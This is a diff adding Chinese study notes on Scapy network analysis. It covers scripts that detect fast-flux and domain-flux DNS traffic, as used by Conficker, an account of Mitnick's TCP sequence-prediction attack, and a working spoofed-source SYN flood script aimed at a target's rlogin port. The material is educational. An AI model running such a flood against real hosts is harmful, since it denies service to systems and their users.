@@ -261,3 +261,103 @@ Conficker 是迄今为止最成功的电脑蠕虫病毒，通过 Windows 服务�
 
 ### 你的 DNS 知道一些不为你所知的吗？
 
+用 tcpdump 检查 DNS 查询过程可以看到，客户端向 DNS 服务器发送了一次请求。具体地说，客户端生成了一个 `DNS Question Record（DNSQR）`，查询对应域名的 IPv4 地址。服务器响应了一个 `DNS Resource Record（DNSRR）`，给出了域名的 IP 地址。
+
+### 使用 Scapy 解析 DNS 流量
+
+在用 Scapy 检查这些 DNS 协议请求包时，要检查的字段在 DNSQR 和 DNSRR 包都存在。一个 DNSQR 包中含有查询的名称（qname）、查询的类型（qtype）和查询的类别（qclass）。服务器相应的一个对应的 DNSRR，其中含有资源记录名名称（rrname）、类型（type）、资源记录类别（rclass）和 TTL。
+
+欧洲网络和信息安全机构（The European Network and Information Security Agency）提供了一个分析网络流量的极好资源，该机构提供一个可启动的 DVD ISO 镜像，其中还含有几个网络抓包文件和练习。其中练习 7 中演示了 `fast-flux` 行为的 pcap 包。
+
+### 用 Scapy 找出 `fast-flux` 流量
+
+写一个 Python 脚本，从 pcap 文件中读取数据，并把所有含 DNSRR 的数据包解析出来
+
+```python
+from scapy.all import *
+dns_records = dict()
+
+def handle_pkt(pkt):
+    if pkt.haslayer(DNSRR):
+        rrname = pkt.getlayer(DNSRR).rrname
+        rdata = pkt.getlayer(DNSRR).rdata
+        if dns_records.has_key(rrname):
+            if rdata not in dns_records[rrname]:
+                dns_records[rrname].append(rdata)
+        else:
+            dns_records[rrname] = list()
+            dns_records[rrname].append(rdata)
+            
+def main():
+    pkts = rdpcap("fast_flux.pcap")
+    for pkt in pkts:
+        handle_pkt(pkt)
+    for item in dns_records:
+        print("[+] {} has {} unique IPs.".format(item, len(dns_records[item])))
+```
+
+### 用 Scapy 找出 Domain Flux 流量
+
+Conficker 使用的是 `domain-flux` 技术，我们需要寻找的就是那些对未知域名查询回复出错消息的服务器响应包。DNS 服务器是没法把大多数域名转换为真正的 IP 地址的，对这些域名，服务器回复一个出错了的消息。可以通过找出所有含域名出错的错误代码的 DNS 响应包的方式，实时地识别出 `domain-flux`
+
+再次读取网络抓包文件，并逐一检查抓包文件中的各个数据包。只检查来自服务器 53 端口的数据包——这种包中含有资源记录。DNS 数据包中有一个 rcode 字段。当 rcode 等于 3 时，表示的是域名不存在。然后把域名打印在屏幕上，并更新所有未得到应答的域名请求的计数器。
+
+```python
+from scapy.all import *
+
+def dns_qrtest(pkt):
+    if pkt.haslayer(DNSRR) and pkt.getlayer(UDP).sport == 53:
+        rcode = pkt.getlayer(DNS).rcode
+        qname = pkt.getlayer(DNSQR).qname
+        if rcode == 3:
+            print("[!] Name request lookup failed: {}".format(qname))
+            return True
+        else:
+            return False
+
+def main():
+    un_ans_reqs = 0
+    pkts = rdpcap("domain_flux.pcap")
+    for pkt in pkts:
+        if dns_qrtest(pkt):
+            un_ans_reqs = un_ans_reqs + 1
+            print("[!] {} Total Unanswered Name Requests".format(un_ans_reqs))
+```
+
+## Kevin Mitnick 和 TCP 序列号预测
+
+Mitnick 使用了一种劫持 TCP 会话的方法。这种技术被称为 TCP 序列号预测，这一技术利用的是原本设计用来区分各个独立的网络连接的 TCP 序列号的生成缺乏随机性这一缺陷。这一缺陷加上 IP 地址欺骗，使得 Mitnick 能够劫持家用电脑中的某个连接。
+
+### 预测你自己的 TCP 序列号
+
+Mitnick 攻击的机器与某台远程服务器之间有可信协议。远程服务器可以通过在 TCP 513 端口上运行的远程登录协议（rlogin）访问 Mitnick 被攻击的计算机。rlogin 并没有使用公钥/私钥协议或口令认证，而是使用了一种不太安全的认证方法——绑定源 IP 地址。
+
+为了攻击电脑，Mitnick 必须做到以下 4 点：
+
+（1）找到一个受信任的服务器
+
+（2）使该服务器无法再做出响应
+
+（3）伪造来自服务器的一个连接
+
+（4）盲目伪造一个 TCP三次握手的适当说明
+
+Mitnick 找到与个人电脑之间有可信协议的远程服务器后，需要使远程服务器不能再发出响应。如果远程服务器发现有人尝试使用服务器 IP 地址进行假连接，它将发送 TCP 重置（reset）数据包关闭连接。为了使服务器无法再做出响应，Mitnick 向服务器上的远程登录（rlogin）端口发出了许多 TCP SYN 数据包，即 SYN 泛洪攻击（SYN Flood），这种攻击将会填满服务器的连接队列，使之无法做出任何响应。
+
+### 使用 Scapy 制造 SYN 泛洪攻击
+
+用 Scapy 重新实现 SYN 泛洪攻击，只需要制造一些载有 TCP 协议层的 IP 数据包，让这些包里 TCP 源端口不断地自增一，而目的 TCP 端口总是为 513
+
+```python
+from scapy.all import *
+
+def syn_flood(src, target):
+    for sport in range(1024, 65535):
+        ip_layer = IP(src=src, dst=target)
+        tcp_layer = TCP(sport=sport, dport=513)
+        pkt = ip_layer / tcp_layer
+        send(pkt)
+src = "10.1.1.2"
+target = "192.168.1.3"
+syn_flood(src, target)
+```
